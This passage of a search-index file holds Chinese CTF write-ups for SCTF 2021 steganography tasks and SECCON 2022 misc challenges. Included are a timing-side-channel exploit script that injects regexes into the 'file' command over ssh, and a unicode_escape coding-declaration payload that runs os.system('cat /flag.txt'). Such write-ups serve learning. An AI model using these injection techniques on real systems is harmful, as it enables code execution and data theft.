\u4e2d\uff0c\u63d0\u53d6\u51fa\u989c\u8272\u5bfc\u51fa\u56fe\u7247\uff1a from PIL import Image import re img = Image . new ( \"RGBA\" , ( 101 , 134 )) pattern = re . compile ( r '\\[38;2;(\\d+?);(\\d+?);(\\d+?)m.' ) with open ( \"fumo_a.txt\" , \"r\" ) as f : for i in range ( 50 ): line = f . readline () . strip () res = pattern . findall ( line ) for j in range ( 133 ): img . putpixel (( i + 50 , j ), tuple ( int ( res [ j ][ k ]) for k in range ( 3 ))) with open ( \"fumo_9.txt\" , \"r\" ) as f : for i in range ( 50 ): line = f . readline () . strip () res = pattern . findall ( line ) for j in range ( 133 ): img . putpixel (( i , j ), tuple ( int ( res [ j ][ k ]) for k in range ( 3 ))) img . save ( \"cli.png\" ) \u7136\u540e fumo \u4e2d\u63d0\u51fa\u7684\u56fe\u548c cli \u63d0\u51fa\u7684\u56fe xor \u5f97\u5230\uff1a \u6ca1\u6709\u6570\u5b57\uff0c\u6240\u4ee5 flag \u662f\uff1a SCTF{Good_FuMo_CTF_OvO}","title":"fumo_xor_cli"},{"location":"writeups/sctf2021/#in_the_vaporwaves","text":"\u542c\u8d77\u6765\u4e2d\u95f4\u6709\u4e00\u6bb5\u611f\u89c9\u4e0d\u592a\u548c\u8c10\uff0c\u628a\u5de6\u53f3\u58f0\u9053\u7684\u9891\u8c31\u56fe xor \u4e86\u4e00\u4e0b\uff1a \u53d1\u73b0\u53ef\u80fd\u4e2d\u95f4\u6709\u641e\u4e8b\u60c5\uff0c\u53c8\u7ec6\u770b\u5bf9\u6bd4\u4e86\u4e00\u4e0b\u5de6\u53f3\u58f0\u9053\u7684\u6ce2\u5f62\u56fe\uff0c\u53d1\u73b0\u4e2d\u95f4\u5dee\u8ddd\u8f83\u5927 wave \u63d0\u53d6\u6570\u636e\uff0c\u5de6\u53f3\u58f0\u9053\u76f8\u52a0\uff1a import wave import numpy as np import matplotlib.pyplot as plt wav = wave . open ( \"c.wav\" , \"r\" ) nframes = wav . getnframes () framerate = wav . getframerate () data = wav . readframes ( nframes ) wav . close () wave_data = np . fromstring ( data , dtype = np . short ) wave_data . shape = - 1 , 2 wave_data = wave_data . T time = np . arange ( 0 , nframes ) * ( 1.0 / framerate ) res = wave_data [ 0 ] + wave_data [ 1 ] plt . figure () # plt.plot(time, res) plt . plot ( time [ 87 * framerate : 128 * framerate ], res [ 87 * framerate : 128 * framerate ]) plt . show () \u4ece\u5f00\u5934\u4e09\u4e2a\u77ed\u7ad6\u7ebf\u53ef\u4ee5\u63a8\u6d4b\u662f\u6469\u5c14\u65af\u7535\u7801\u8f6c\u6362\u7684 SCTF \u5f00\u5934\uff0c\u957f\u77ed\u6284\u4e0b\u6765\u7136\u540e\u6469\u5c14\u65af\u89e3\u7801\uff0c\u5f97\u5230 flag ... -.-. - ..-. -.. . ... .---- .-. ...-- ..--.- -.. .-. .. ...- . ... ..--.- .. -. - ----- ..--.- ...- .- .--. --- .-. .-- .--.-. ...- . ... SCTFDES1R3_DRIVES_INT0_VAPORW@VES flag: SCTF{DES1R3_DRIVES_INT0_VAPORW@VES}","title":"in_the_vaporwaves"},{"location":"writeups/seccon2022/","text":"SECCON CTF 2022 Quals Writeup \u00b6 Abstract \u9694\u4e86\u51e0\u5e74\u540e\u7b2c\u4e00\u6b21\u6709\u65e5\u672c\u7ebf\u4e0b\u51b3\u8d5b\u7684 SECCON\uff0c\u961f\u91cc\u51b3\u5b9a\u597d\u597d\u6253\u4e00\u4e0b\uff0c\u9884\u9009\u8d5b 24 \u5c0f\u65f6\uff0c\u6700\u540e\u52c9\u5f3a\u538b\u7ebf\u8fdb\u4e86\u51b3\u8d5b\u3002 misc \u9898\u6bd4\u8f83\u5750\u7262\uff0c\u5927\u6982\u5c31\u662f\u6e90\u7801\u5f88\u7b80\u5355\uff0c\u4f46\u662f\u5c31\u662f\u5f88\u96be\u60f3\u51fa\u6765\u505a\u6cd5\u3002\u800c\u4e14\u6709\u90a3\u4e48\u4e00\u4e1d hackergame \u7684\u5473\u9053\u3002 \u5728\u961f\u53cb\u5e2e\u52a9\u4e0b\u8fd8\u662f\u5dee\u4e86\u4e00\u9053 AK\uff0c\u4e0d\u8fc7\u90a3\u4e00\u9053\u540e\u6765\u5728 discord \u770b\u5230\u4e86\u522b\u4eba\u5206\u4eab\u7684 payload\uff0c\u5176\u5b9e\u89e3\u6cd5\u4e5f\u4e0d\u96be\u7684\uff0c\u53ef\u60dc\u4e86\u2026\u2026 noiseccon \u90a3\u9898\u6211\u57fa\u672c\u6ca1\u53c2\u4e0e\uff0c\u6ca1\u7ec6\u770b\uff0c\u5c31\u4e0d\u5199\u4e86\u3002 find flag \u00b6 \u9898\u76ee\u6e90\u7801 #!/usr/bin/env python3.9 import os FLAG = os . getenv ( \"FLAG\" , \"FAKECON{*** REDUCTED ***}\" ) . encode () def check (): try : filename = input ( \"filename: \" ) if open ( filename , \"rb\" ) . read ( len ( FLAG )) == FLAG : return True except FileNotFoundError : print ( \"[-] missing\" ) except IsADirectoryError : print ( \"[-] seems wrong\" ) except PermissionError : print ( \"[-] not mine\" ) except OSError : print ( \"[-] hurting my eyes\" ) except KeyboardInterrupt : print ( \"[-] gone\" ) return False if __name__ == '__main__' : try : check = check () except : print ( \"[-] something went wrong\" ) exit ( 1 ) finally : if check : print ( \"[+] congrats!\" ) print ( FLAG . decode ()) \u6e90\u7801\u4e0d\u957f\uff0c\u5c31\u662f\u8f93\u5165\u4e00\u4e2a\u6587\u4ef6\u540d\uff0c\u7136\u540e\u5b83\u4f1a\u8bfb\u53d6\uff0c\u5982\u679c\u5f00\u5934\u5c31\u662f flag\uff0c\u90a3\u4e48\u5c31\u8f93\u51fa flag\u3002 \u521a\u5f00\u59cb\u7684\u65f6\u5019\u6211\u4eec\u5c31\u4ee5\u4e3a\u662f\u8981\u627e\u8fd9\u6837\u7684\u4e00\u4e2a\u6587\u4ef6\u3002\u6d4b\u8bd5\u4e86\u597d\u591a\uff0c\u53cd\u6b63\u662f /proc/1/environ \u548c /proc/self/environ \u91cc\u662f\u6709 flag \u7684\uff0c\u4f46\u662f\u5b83\u4e0d\u5728\u5f00\u5934\u3002\u6240\u4ee5\u60f3\u8981\u627e\u529e\u6cd5\u8ba9 open \u8bfb\u53d6\u7684\u65f6\u5019\u81ea\u5e26\u504f\u79fb\u3002\u7ffb\u4e86\u6e90\u7801\u4e5f\u641e\u4e0d\u61c2\u3002 \u7136\u540e\u662f\u5728\u4e00\u6b21\u672c\u5730\u6d4b\u8bd5\u7684\u65f6\u5019\uff0c\u6dfb\u52a0\u7684\u989d\u5916\u547d\u4ee4\u5076\u7136\u89e6\u53d1\u4e86\u7f16\u7801\u9519\u8bef\uff0c\u4f46\u662f\u5374\u5f39\u51fa\u4e86 flag\uff0c\u540c\u65f6\u9644\u5e26\u7684\u8fd8\u6709 \"[-] something went wrong\"\u3002 \u8fd9\u624d\u60f3\u8d77\u6765 python \u7684 try-except-finally \u8bed\u53e5\u662f\u65e0\u8bba\u5982\u4f55\u90fd\u4f1a\u6267\u884c finally\uff0c\u800c\u4e14\u5982\u679c check \u51fd\u6570\u4e2d\u95f4\u4ea7\u751f\u4e86\u5176\u5b83\u6ca1\u6709\u88ab\u6355\u83b7\u7684\u5f02\u5e38\u7684\u8bdd\u5c31\u4f1a\u9000\u51fa\uff0c\u7136\u540e\u8fd9\u4e2a\u5f02\u5e38\u88ab main \u91cc\u7684 except \u6355\u83b7\u3002\u867d\u7136 exit(1) \u4e86\uff0c\u4f46\u662f\u5e76\u4e0d\u4f1a\u9000\u51fa\u7a0b\u5e8f\uff0c\u800c\u662f\u4f1a\u8fdb\u5165\u5230 finally \u5757\u4e2d\u3002\u800c\u4e14\u6b64\u65f6\u7531\u4e8e check \u51fd\u6570\u88ab\u4e2d\u65ad\u4e86\uff0c\u6240\u4ee5 check \u53d8\u91cf\u540d\u6ca1\u6709\u88ab\u91cd\u65b0\u8d4b\u503c\uff0c\u5b83\u4fdd\u7559\u7684\u4ecd\u7136\u662f\u8fd9\u4e2a\u51fd\u6570\uff0c\u6240\u4ee5 if check \u81ea\u7136\u5c31\u6210\u7acb\u4e86\u3002 \u6240\u4ee5\u8fd9\u662f\u4e00\u9053\u7eaf\u7684 python \u8bed\u8a00\u7279\u6027\u9898\uff0c\u6700\u7ec8\u76ee\u6807\u5c31\u662f\u8981\u5728 check \u51fd\u6570\u7684 try \u5757\u4e2d\u89e6\u53d1\u9664\u4e86 FileNotFoundError\u3001IsADirectoryError\u3001PermissionError\u3001OSError\u3001KeyboardInterrupt \u4e4b\u5916\u7684\u5f02\u5e38\u3002\u53ef\u4ee5\u76f4\u63a5\u5728\u8f93\u5165\u7684\u65f6\u5019\u6309\u4e0b Ctrl-D\uff0c\u8fd9\u4f1a\u53d1\u9001\u4e00\u4e2a EOF\uff0c\u9020\u6210 input \u7684 EOFError\uff1b\u4e5f\u53ef\u4ee5\u8f93\u5165\u4e00\u4e2a \\x00\\n \u4e4b\u7c7b\u7684\uff0c\u8ba9 open \u51fd\u6570\u629b\u51fa ValueError\u3002\u7136\u540e\u5c31\u4f1a\u4f9d\u6b21\u8fdb\u5165 except \u548c finally \u5757\u5e76\u8f93\u51fa flag \u4e86\u3002 flag: SECCON{exit_1n_Pyth0n_d0es_n0t_c4ll_exit_sysc4ll} txtchecker \u00b6 \u5f88\u5750\u7262\u4f46\u5f88\u6709\u610f\u601d\u7684\u4e00\u9053\u9898\u3002\u9898\u76ee\u4ee3\u7801\u4e3b\u4f53\u5c31\u53ea\u6709\uff1a #!/bin/bash read -p \"Input a file path: \" filepath file $filepath 2 >/dev/null | grep -q \"ASCII text\" 2 >/dev/null exit 0 \u4f1a\u901a\u8fc7 ssh ForceCommand \u5f3a\u5236\u6bcf\u6b21\u8fde\u63a5\u6267\u884c\u8fd9\u4e2a\u811a\u672c\u3002flag \u5b58\u653e\u5728 /flag.txt \u4e2d\u3002 \u8fd9\u4e2a\u811a\u672c\u53ef\u63a7\u7684\u53ea\u6709 file \u547d\u4ee4\u7684\u53c2\u6570\uff0c\u800c\u4e14\u5176 stdin \u4f1a\u901a\u8fc7\u7ba1\u9053\u4f20\u7ed9\u540e\u9762\u7684 grep\uff0cgrep \u4f7f\u7528\u4e86 -q \u4e5f\u5c31\u662f --quiet\uff0c\u4e0d\u8f93\u51fa\u4efb\u4f55\u4fe1\u606f\u3002\u800c\u4e14\u4e24\u6761\u6307\u4ee4\u7684 stderr \u90fd\u88ab\u91cd\u5b9a\u5411\u5230\u4e86\u9ed1\u6d1e\u4e2d\u3002\u5e76\u4e14\u4e0d\u8bba\u7ed3\u679c\u5982\u4f55\u90fd\u4f1a exit 0\u3002\u6240\u4ee5\u5c31\u662f\u4e00\u4e2a\u65e0\u4efb\u4f55\u56de\u663e\u3001\u65e0\u8fd4\u56de\u503c\u7684\u811a\u672c\u3002 \u6240\u4ee5\u601d\u8def\u4e5f\u5c31\u53ea\u6709\u4e24\u4e2a\uff0c\u4e00\u4e2a\u662f\u7ed5\u8fc7\uff0c\u7136\u540e getshell\uff0c\u4f46\u662f\u8bd5\u4e86\u4e00\u4e0b\u4e0d\u592a\u53ef\u884c\uff0c\u800c\u4e14\u6240\u6709\u961f\u4f0d\u90fd\u8fde\u63a5\u540c\u4e00\u4e2a\u673a\u5668\uff0c\u5982\u679c\u662f\u8fd9\u6837\u7684\u8bdd\u6050\u6015\u65e9\u5c31\u88ab\u6253\u70c2\u4e86\u3002\u53e6\u4e00\u4e2a\u601d\u8def\u5c31\u662f\u4fa7\u4fe1\u9053\u3002 \u7ffb\u4e86 file \u7684 man page \uff0c\u5176\u4e2d\u6709\u4e00\u4e2a -m \u53c2\u6570\u53ef\u4ee5\u6307\u5b9a magic \u6587\u4ef6\uff0c\u8fd9\u4e2a magic \u6587\u4ef6\u662f\u7528\u6765\u5224\u65ad\u6587\u4ef6\u7c7b\u578b\u7684\uff0c\u5b83\u4e5f\u6709 man page \uff0c\u91cc\u9762\u6709\u76f8\u5173\u7684\u683c\u5f0f\u3002\u9664\u6b64\u4e4b\u5916\u4e5f\u641c\u5230\u4e86 file \u6e90\u7801\u4e2d\u7684\u81ea\u5e26 magic file \u4ee5\u53ca\u4e00\u4e2a\u7b2c\u4e09\u65b9 magic file \u7684 repo lindenb/magic \u3002 -m \u53c2\u6570\u53ea\u80fd\u6307\u5b9a magic file \u6587\u4ef6\uff0c\u800c\u6211\u4eec\u60f3\u8981\u7684\u80af\u5b9a\u662f\u4e0d\u5b58\u5728\u670d\u52a1\u5668\u4e0a\u7684\u3002\u6240\u4ee5\u8981\u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6\uff0c\u8bd5\u4e86\u4e00\u4e0b -m /dev/stdin \u662f\u53ef\u4ee5\u7684\uff0c\u6bd4\u5982\u8f93\u5165 /flag -m /dev/stdin \uff0c\u7136\u540e\u5c31\u4f1a\u8981\u6c42\u8f93\u5165 magic file \u5185\u5bb9\uff0c\u7528 Ctrl-D \u7ed3\u675f\u3002\u6309\u7167\u4e0a\u9762\u7684\u4e00\u4e9b\u683c\u5f0f\uff0c\u5c1d\u8bd5\u4f7f\u7528\u6700\u65b9\u4fbf\u7684 regex\uff0c\u672c\u5730\u8c03\u8bd5\uff1a $ echo \"/flag.txt -m /dev/stdin\\n0 regex .* flag\" | ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@localhost -p 2022 Pseudo-terminal will not be allocated because stdin is not a terminal. ctf@localhost's password: /flag.txt: flag, ASCII text $ echo \"/flag.txt -m /dev/stdin\\n0 regex .* %s\" | ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@localhost -p 2022 Pseudo-terminal will not be allocated because stdin is not a terminal. ctf@localhost's password: /flag.txt: SECCON{dummy}, ASCII text \u6240\u4ee5\u5176\u5b9e\u5982\u679c\u6709\u56de\u663e\u7684\u8bdd\u5c31\u80fd\u76f4\u63a5\u6cc4\u9732\u51fa flag \u4e86\u3002\u4f46\u662f\u73b0\u5728\u8fd9\u6837\u53ea\u80fd\u901a\u8fc7\u4fa7\u4fe1\u9053\uff0c\u53ef\u4ee5\u901a\u8fc7\u65f6\u95f4\u957f\u77ed\u6765\u5224\u522b\u3002\u65e2\u7136\u662f\u901a\u8fc7\u6b63\u5219\u5339\u914d\uff0c\u90a3\u4e48\u6211\u4eec\u7406\u8bba\u5c31\u53ef\u4ee5\u901a\u8fc7\u8ba9\u5339\u914d\u548c\u4e0d\u5339\u914d\u65f6\u95f4\u4ea7\u751f\u5dee\u522b\uff0c\u7136\u540e\u9010\u5b57\u7b26 leak \u51fa flag\u3002 \u7136\u540e\u5c31\u641c\u4e86\u641c ReDoS\uff0c\u770b\u4e0d\u592a\u61c2\uff08\u4e4b\u540e\u6709\u65f6\u95f4\u8865\u4e00\u8865\uff09\uff0c\u4f46\u662f\u611f\u89c9\u5728\u8fd9\u91cc\u90fd\u4e0d\u592a\u53ef\u7528\uff0c\u7136\u540e\u56db\u8001\u5e08\u7ed9\u4e86\u4e00\u4e2a (.?){0, 1000} \u8fd9\u4e2a\u6b63\u5219\u662f\u53ef\u4ee5\u5361\u4f4f\u7684\u3002 \u518d\u770b magic \u7684\u683c\u5f0f\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u6587\u4ef6\u7c7b\u578b\u53ef\u4ee5\u6709\u591a\u6b21\u5339\u914d\uff0c\u5176\u5c42\u7ea7\u901a\u8fc7 > \u6765\u8868\u793a\u3002\u4f8b\u5982\uff1a 0 regex pattern1 >0x18 regex pattern2 type1 >0x18 regex pattern3 type2 >>0x... \u5176\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6811\u72b6\u7684\u7ed3\u6784\uff0c\u524d\u9762\u7684\u4e0d\u6210\u7acb\u7684\u8bdd\uff0c\u4e0b\u4e00\u5c42\u5c31\u4e0d\u4f1a\u7ee7\u7eed\u5339\u914d\u3002\u6240\u4ee5\u53ef\u4ee5\u5728\u7b2c\u4e00\u5c42\u5224\u65ad\u662f\u5426\u5339\u914d flag\uff0c\u5728\u7b2c\u4e8c\u5c42\u901a\u8fc7\u524d\u9762\u7684\u6b63\u5219\u6765\u5361\u4f4f\uff0c\u8fd9\u6837\u5339\u914d\u4e0a\u7684\u8bdd\u65f6\u95f4\u5c31\u4f1a\u62d6\u6162\uff0c\u800c\u6bcf\u5339\u914d\u4e0a\u7684\u5c31\u4f1a\u8f83\u5feb\u4e00\u70b9\u3002\u6240\u4ee5\u8bbe\u8ba1\u7684 magic file payload \u5c31\u662f\uff1a 0 regex SECCON\\\\{%s(.)+\\\\} aaa >0 regex (.?){0, 1000} a \u7136\u540e\u5199\u4e00\u4e2a\u7a0b\u5e8f\u9010\u5b57\u7b26\u5c1d\u8bd5\uff0c\u7136\u540e\u53d6\u65f6\u95f4\u6700\u957f\u7684\u4e00\u4e2a\u586b\u5165 flag \u5e76\u7ee7\u7eed\uff0c\u5c31\u53ef\u4ee5\u4e00\u70b9\u4e00\u70b9 leak \u51fa flag\u3002 exp s = 'echo \"/flag.txt -m /dev/stdin \\n 0 regex SECCON \\\\\\\\\\\\\\\\ { %s (.)+ \\\\\\\\\\\\\\\\ } aaa \\n >0 regex (.?){0,1000} a\" | sshpass -p ctf ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@txtchecker.seccon.games -p 2022' import os , time , string import subprocess flag = \"\" for rd in range ( 10 ): res , best = None , None for i in \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_$\" : print ( i , end = \" \" ) st = time . time () subprocess . run ( s % ( flag + i ), shell = True , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) t = time . time () - st print ( t ) if ( res is None ) or t > best : res = i best = t flag = flag + res print ( f \"SECCON {{ { flag } \" ) \u627e\u961f\u53cb\u8981\u4e86\u4e00\u4e2a\u65e5\u672c\u7684\u5ef6\u8fdf\u5c0f\u7684\u670d\u52a1\u5668\uff0c\u8dd1\u4e86\u4e00\u4e0b\uff0c\u5f97\u5230 flag: SECCON{reDo5L1fe} latexipy \u00b6 \u9898\u76ee\u4e3b\u4f53\u4ee3\u7801 import sys import ast import re import tempfile from importlib import util def get_fn_name ( source : str ) -> str | None : root = ast . parse ( source ) if type ( root ) is not ast . Module : return None if len ( root . body ) != 1 : return None fn = root . body [ 0 ] if type ( fn ) is not ast . FunctionDef : return None fn . body . clear () if not re . fullmatch ( r \"def \\w+\\((\\w+(, \\w+)*)?\\):\" , ast . unparse ( fn )): # You must define a function without decorators, type annotations, and so on. return None return str ( fn . name ) print ( \"\"\" Latexify as a Service! E.g. def solve(a, b, c): return (-b + math.sqrt(b 2 - 4 a c)) / (2*a) ref. https://github.com/google/latexify_py/blob/v0.1.1/examples/equation.ipynb Input your function (the last line must start with __EOF__): \"\"\".strip(), flush=True) source = \"\" while True: line = sys.stdin.readline() if line.startswith(\"__EOF__\"): break source += line name = get_fn_name(source) if name is None: print(\"Invalid source\") exit(1) source += f\"\"\" import latexify __builtins__[\"print\"](latexify.get_latex({name})) \"\"\" with tempfile.NamedTemporaryFile(suffix=\".py\") as file: file.write(source.encode()) file.flush() print() print(\"Result:\") spec = util.spec_from_file_location(\"tmp\", file.name) spec.loader.exec_module(util.module_from_spec(spec)) \u53cd\u6b63\u5c31\u662f\u8f93\u5165\u4e00\u4e2a\u51fd\u6570\uff08\u53ea\u80fd\u662f\u5355\u72ec\u4e00\u4e2a\u51fd\u6570\uff0c\u4e0d\u80fd\u6709\u88c5\u9970\u5668\u3001\u7c7b\u578b\u6ce8\u89e3\u7b49\uff09\uff0c\u7136\u540e\u62fc\u63a5\u8d77\u6765\u5f97\u5230\u4e00\u4e2a\u4e34\u65f6\u4ee3\u7801\u6587\u4ef6\uff0c\u7136\u540e\u8fd0\u884c\u3002\u6548\u679c\u5c31\u662f\u5229\u7528 v0.1.1 \u7248\u672c\u7684 latexify \u6765\u8bb2\u8fd9\u4e2a\u51fd\u6570\u8f6c\u6362\u4e3a LaTeX \u8bed\u6cd5\u7684\u8868\u793a\u3002flag \u5728 /flag.txt\uff0c\u8981\u8bd5\u56fe\u8bfb\u53d6\u5b83\u3002 \u7ffb\u4e86 latexify \u7684\u6e90\u7801\uff0cv0.1.1 \u7684\u4ee3\u7801\u5f88\u7b80\u5355\uff0c\u4e3b\u8981\u5c31\u662f core.py \u4e00\u4e2a\u6587\u4ef6\u91cc\u904d\u5386\u4e86\u4e00\u904d ast \u6811\u3002\u6ca1\u6709\u4efb\u4f55 eval \u4e4b\u7c7b\u7684\u3001\u4e5f\u6ca1\u6709\u4efb\u4f55\u8c03\u7528\u90e8\u4ef6\u7684\u5730\u65b9\u3002\u9898\u76ee\u4e5f\u9650\u5236\u7684\u5f88\u6b7b\uff0c\u4e5f\u6ca1\u6709\u8c03\u7528\u7684\u5730\u65b9\u3002\u552f\u4e00\u53ef\u80fd\u5229\u7528\u7684\u662f\u63d0\u4f9b\u4e00\u4e2a print \u51fd\u6570\u8bd5\u56fe\u5728\u6253\u5370\u7ed3\u679c\u7684\u65f6\u5019\u8c03\u7528\uff0c\u4f46\u662f\u5b83\u53c8\u7528\u7684\u662f __builtins__[\"print\"] \u9632\u6b62\u4e86\u8fd9\u4e00\u884c\u4e3a\u3002 \u60f3\u4e86\u5f88\u591a\u3001\u8bd5\u4e86\u5f88\u591a\u3001\u4e5f\u7ffb\u4e86\u6e90\u7801\uff0c\u6ca1\u505a\u51fa\u6765\u3002 \u8d5b\u540e\u770b\u4e86 discord \u4e0a\u522b\u4eba\u5206\u4eab\u7684 payload\uff0c\u5f88\u7b80\u5355\uff0c\u6539\u4e86\u4e00\u4e0b\u5c31\u662f\uff1a # coding: unicode_escape def exp (): return \" \\u0022\\u000a __import__('os').system('cat /flag.txt') \\u000a\\u0022 \" __EOF__ \u8fd9\u4e2a\u539f\u7406\u4e5f\u5f88\u7b80\u5355\u3002\u5c31\u662f\u5728 get_fn_name \u8fdb\u884c\u68c0\u67e5\u7684\u65f6\u5019\u662f\u76f4\u63a5\u5bf9\u8f93\u5165\u8fdb\u884c ast \u89e3\u6790\u7136\u540e\u68c0\u67e5\u8bed\u6cd5\u6811\u7684\uff0c\u8fd9\u65f6\u6ce8\u91ca\u4f1a\u88ab\u5ffd\u7565\uff0creturn \u7684\u5b57\u7b26\u4e32\u662f\u5b8c\u6574\u7684\uff0c\u6240\u4ee5\u4e00\u5207\u68c0\u67e5\u90fd\u53ef\u4ee5\u901a\u8fc7\u3002 \u800c\u5f53\u8fd0\u884c\u7684\u65f6\u5019\u662f\u5c06\u5176\u5199\u5165\u6587\u4ef6\u7136\u540e\u8fd0\u884c\u6587\u4ef6\u7684\u3002\u6211\u4eec\u7684\u8f93\u5165\u5728\u5f00\u5934\uff0c\u7b2c\u4e00\u884c\u7684\u6ce8\u91ca\u5c31\u6307\u5b9a\u4e86\u6587\u4ef6\u7f16\u7801\u4e3a unicode_escape\uff0c\u6240\u4ee5\u5728\u8fd0\u884c\u7684\u65f6\u5019\u89e3\u7801\u5f97\u5230\u7684\u5c31\u76f8\u5f53\u4e8e\uff1a # coding: unicode_escape def exp () return \"\" __import__ ( 'os' ) . system ( 'cat /flag.txt' ) \"\" import latexify __builtins__ [ \"print\" ]( latexify . get_latex ({ name })) \u6240\u4ee5\u5728\u6267\u884c\u7684\u65f6\u5019\u5c31\u4f1a cat flag \u4e86: SECCON{UTF7_is_hack3r_friend1y_encoding}","title":"SECCON 2022 Quals"},{"location":"writeups/seccon2022/#seccon-ctf-2022-quals-writeup","text":"Abstract \u9694\u4e86\u51e0\u5e74\u540e\u7b2c\u4e00\u6b21\u6709\u65e5\u672c\u7ebf\u4e0b\u51b3\u8d5b\u7684 SECCON\uff0c\u961f\u91cc\u51b3\u5b9a\u597d\u597d\u6253\u4e00\u4e0b\uff0c\u9884\u9009\u8d5b 24 \u5c0f\u65f6\uff0c\u6700\u540e\u52c9\u5f3a\u538b\u7ebf\u8fdb\u4e86\u51b3\u8d5b\u3002 misc \u9898\u6bd4\u8f83\u5750\u7262\uff0c\u5927\u6982\u5c31\u662f\u6e90\u7801\u5f88\u7b80\u5355\uff0c\u4f46\u662f\u5c31\u662f\u5f88\u96be\u60f3\u51fa\u6765\u505a\u6cd5\u3002\u800c\u4e14\u6709\u90a3\u4e48\u4e00\u4e1d hackergame \u7684\u5473\u9053\u3002 \u5728\u961f\u53cb\u5e2e\u52a9\u4e0b\u8fd8\u662f\u5dee\u4e86\u4e00\u9053 AK\uff0c\u4e0d\u8fc7\u90a3\u4e00\u9053\u540e\u6765\u5728 discord \u770b\u5230\u4e86\u522b\u4eba\u5206\u4eab\u7684 payload\uff0c\u5176\u5b9e\u89e3\u6cd5\u4e5f\u4e0d\u96be\u7684\uff0c\u53ef\u60dc\u4e86\u2026\u2026 noiseccon \u90a3\u9898\u6211\u57fa\u672c\u6ca1\u53c2\u4e0e\uff0c\u6ca1\u7ec6\u770b\uff0c\u5c31\u4e0d\u5199\u4e86\u3002","title":"SECCON CTF 2022 Quals Writeup"},{"location":"writeups/seccon2022/#find-flag","text":"\u9898\u76ee\u6e90\u7801 #!/usr/bin/env python3.9 import os FLAG = os . getenv ( \"FLAG\" , \"FAKECON{*** REDUCTED ***}\" ) . encode () def check (): try : filename = input ( \"filename: \" ) if open ( filename , \"rb\" ) . read ( len ( FLAG )) == FLAG : return True except FileNotFoundError : print ( \"[-] missing\" ) except IsADirectoryError : print ( \"[-] seems wrong\" ) except PermissionError : print ( \"[-] not mine\" ) except OSError : print ( \"[-] hurting my eyes\" ) except KeyboardInterrupt : print ( \"[-] gone\" ) return False if __name__ == '__main__' : try : check = check () except : print ( \"[-] something went wrong\" ) exit ( 1 ) finally : if check : print ( \"[+] congrats!\" ) print ( FLAG . decode ()) \u6e90\u7801\u4e0d\u957f\uff0c\u5c31\u662f\u8f93\u5165\u4e00\u4e2a\u6587\u4ef6\u540d\uff0c\u7136\u540e\u5b83\u4f1a\u8bfb\u53d6\uff0c\u5982\u679c\u5f00\u5934\u5c31\u662f flag\uff0c\u90a3\u4e48\u5c31\u8f93\u51fa flag\u3002 \u521a\u5f00\u59cb\u7684\u65f6\u5019\u6211\u4eec\u5c31\u4ee5\u4e3a\u662f\u8981\u627e\u8fd9\u6837\u7684\u4e00\u4e2a\u6587\u4ef6\u3002\u6d4b\u8bd5\u4e86\u597d\u591a\uff0c\u53cd\u6b63\u662f /proc/1/environ \u548c /proc/self/environ \u91cc\u662f\u6709 flag \u7684\uff0c\u4f46\u662f\u5b83\u4e0d\u5728\u5f00\u5934\u3002\u6240\u4ee5\u60f3\u8981\u627e\u529e\u6cd5\u8ba9 open \u8bfb\u53d6\u7684\u65f6\u5019\u81ea\u5e26\u504f\u79fb\u3002\u7ffb\u4e86\u6e90\u7801\u4e5f\u641e\u4e0d\u61c2\u3002 \u7136\u540e\u662f\u5728\u4e00\u6b21\u672c\u5730\u6d4b\u8bd5\u7684\u65f6\u5019\uff0c\u6dfb\u52a0\u7684\u989d\u5916\u547d\u4ee4\u5076\u7136\u89e6\u53d1\u4e86\u7f16\u7801\u9519\u8bef\uff0c\u4f46\u662f\u5374\u5f39\u51fa\u4e86 flag\uff0c\u540c\u65f6\u9644\u5e26\u7684\u8fd8\u6709 \"[-] something went wrong\"\u3002 \u8fd9\u624d\u60f3\u8d77\u6765 python \u7684 try-except-finally \u8bed\u53e5\u662f\u65e0\u8bba\u5982\u4f55\u90fd\u4f1a\u6267\u884c finally\uff0c\u800c\u4e14\u5982\u679c check \u51fd\u6570\u4e2d\u95f4\u4ea7\u751f\u4e86\u5176\u5b83\u6ca1\u6709\u88ab\u6355\u83b7\u7684\u5f02\u5e38\u7684\u8bdd\u5c31\u4f1a\u9000\u51fa\uff0c\u7136\u540e\u8fd9\u4e2a\u5f02\u5e38\u88ab main \u91cc\u7684 except \u6355\u83b7\u3002\u867d\u7136 exit(1) \u4e86\uff0c\u4f46\u662f\u5e76\u4e0d\u4f1a\u9000\u51fa\u7a0b\u5e8f\uff0c\u800c\u662f\u4f1a\u8fdb\u5165\u5230 finally \u5757\u4e2d\u3002\u800c\u4e14\u6b64\u65f6\u7531\u4e8e check \u51fd\u6570\u88ab\u4e2d\u65ad\u4e86\uff0c\u6240\u4ee5 check \u53d8\u91cf\u540d\u6ca1\u6709\u88ab\u91cd\u65b0\u8d4b\u503c\uff0c\u5b83\u4fdd\u7559\u7684\u4ecd\u7136\u662f\u8fd9\u4e2a\u51fd\u6570\uff0c\u6240\u4ee5 if check \u81ea\u7136\u5c31\u6210\u7acb\u4e86\u3002 \u6240\u4ee5\u8fd9\u662f\u4e00\u9053\u7eaf\u7684 python \u8bed\u8a00\u7279\u6027\u9898\uff0c\u6700\u7ec8\u76ee\u6807\u5c31\u662f\u8981\u5728 check \u51fd\u6570\u7684 try \u5757\u4e2d\u89e6\u53d1\u9664\u4e86 FileNotFoundError\u3001IsADirectoryError\u3001PermissionError\u3001OSError\u3001KeyboardInterrupt \u4e4b\u5916\u7684\u5f02\u5e38\u3002\u53ef\u4ee5\u76f4\u63a5\u5728\u8f93\u5165\u7684\u65f6\u5019\u6309\u4e0b Ctrl-D\uff0c\u8fd9\u4f1a\u53d1\u9001\u4e00\u4e2a EOF\uff0c\u9020\u6210 input \u7684 EOFError\uff1b\u4e5f\u53ef\u4ee5\u8f93\u5165\u4e00\u4e2a \\x00\\n \u4e4b\u7c7b\u7684\uff0c\u8ba9 open \u51fd\u6570\u629b\u51fa ValueError\u3002\u7136\u540e\u5c31\u4f1a\u4f9d\u6b21\u8fdb\u5165 except \u548c finally \u5757\u5e76\u8f93\u51fa flag \u4e86\u3002 flag: 